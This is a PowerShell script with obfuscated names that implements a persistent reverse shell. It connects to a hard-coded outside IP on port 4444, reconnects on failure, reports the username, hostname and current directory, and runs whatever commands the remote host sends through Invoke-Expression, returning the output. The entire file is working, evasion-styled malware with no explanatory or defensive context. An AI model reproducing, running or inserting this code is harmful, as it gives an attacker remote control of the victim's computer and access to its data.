class QbcCSIhjlrzHoeaemP {
    
    [string]$vbYuNxvIxtcqcQDm = "93.49.240.195"
    [int]$OTlwqDwKpLTkWMznubytiS = 4444

    $hUnByzkQYRtB
    $QlWwpdGUC
    $iBALl
    $dLJkbyOExhXwkARAQcalDdA
    $VmVtgRlWLsuF
    $QoLZZlbajFgYRDbnrXM
    [int]$YvGeSYkRYgtxGDgyMfTWPhyT = 50*1024

    qQjlVAAj() {
        $this.QlWwpdGUC = $false
        while ($true) {
            try {
                $this.QlWwpdGUC = New-Object Net.Sockets.TcpClient($this.vbYuNxvIxtcqcQDm, $this.OTlwqDwKpLTkWMznubytiS)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.bCvEQm()
    }

    bCvEQm() {
        $this.hUnByzkQYRtB = $this.QlWwpdGUC.GetStream()
        $this.dLJkbyOExhXwkARAQcalDdA = New-Object Byte[] $this.YvGeSYkRYgtxGDgyMfTWPhyT
        $this.QoLZZlbajFgYRDbnrXM = New-Object Text.UTF8Encoding
        $this.iBALl = New-Object IO.StreamWriter($this.hUnByzkQYRtB, [Text.Encoding]::UTF8, $this.YvGeSYkRYgtxGDgyMfTWPhyT)
        $this.VmVtgRlWLsuF = New-Object System.IO.StreamReader($this.hUnByzkQYRtB)
        $this.iBALl.AutoFlush = $true
    }

    ydLZnMRRAbnDAkgVYaqNaxI() {
        $this.qQjlVAAj()
        $this.jpChgJNCdnRbIeAeNWQMAT()
    }

    XuAreColDoeeYtJeZUAIfMqe($LlAVaTCMaGGRCLGgbrw) {
        try {
            [byte[]]$pSdmRQn = [text.Encoding]::Ascii.GetBytes($LlAVaTCMaGGRCLGgbrw)
            $this.iBALl.Write($pSdmRQn, 0, $pSdmRQn.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.ydLZnMRRAbnDAkgVYaqNaxI()
        }
    }

    [string] lLLNMGrB() {
        try {
            $xpgPrLXiQQ = $this.hUnByzkQYRtB.Read($this.dLJkbyOExhXwkARAQcalDdA, 0, $this.YvGeSYkRYgtxGDgyMfTWPhyT)    
            $zMhdcMQmNrvRaVX = ($this.QoLZZlbajFgYRDbnrXM.GetString($this.dLJkbyOExhXwkARAQcalDdA, 0, $xpgPrLXiQQ))
            return $zMhdcMQmNrvRaVX
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.ydLZnMRRAbnDAkgVYaqNaxI()
            return ""
        }
    }

    [string] KCpItMJtLgN($ifDLFVKrQdkFiw) {
        Write-Host $ifDLFVKrQdkFiw
        try { 
            $ziaOMrSBxnuCNqkfk = Invoke-Expression $ifDLFVKrQdkFiw | Out-String
        }
        catch {
            $thgzNmLlSMJwJApN = $_.Exception
            $dyhXcFydRiJwOZuWFbmvld = $_.Message
            $ziaOMrSBxnuCNqkfk = "`n$_`n"
        }
        return $ziaOMrSBxnuCNqkfk
    }

    [string] tgKGDRDaezZfU() {
        $FkkOYvQPzpRZE = [Environment]::UserName
        $mEeonNUzfQRGUKqqJ = [System.Net.Dns]::GetHostName()
        $DKhmTZbgoxgxoWgxbEoCNqv = Get-Location
        return "$FkkOYvQPzpRZE@$mEeonNUzfQRGUKqqJ [$DKhmTZbgoxgxoWgxbEoCNqv]~$ "
    }

    jpChgJNCdnRbIeAeNWQMAT() {
        while ($this.QlWwpdGUC.Connected) {
            $this.XuAreColDoeeYtJeZUAIfMqe($this.tgKGDRDaezZfU())         
            $zMhdcMQmNrvRaVX = $this.lLLNMGrB()
            $ziaOMrSBxnuCNqkfk = "`n"
            if ([string]::IsNullOrEmpty($zMhdcMQmNrvRaVX)) {
                continue
            }
            $ziaOMrSBxnuCNqkfk = $this.KCpItMJtLgN($zMhdcMQmNrvRaVX)
            $this.XuAreColDoeeYtJeZUAIfMqe($ziaOMrSBxnuCNqkfk + "`n")
            $this.hUnByzkQYRtB.Flush()
        }
        $this.QlWwpdGUC.Close()
        $this.ydLZnMRRAbnDAkgVYaqNaxI()
    } 
}

$kSHwhooeytwxI = [QbcCSIhjlrzHoeaemP]::new()
$kSHwhooeytwxI.ydLZnMRRAbnDAkgVYaqNaxI()
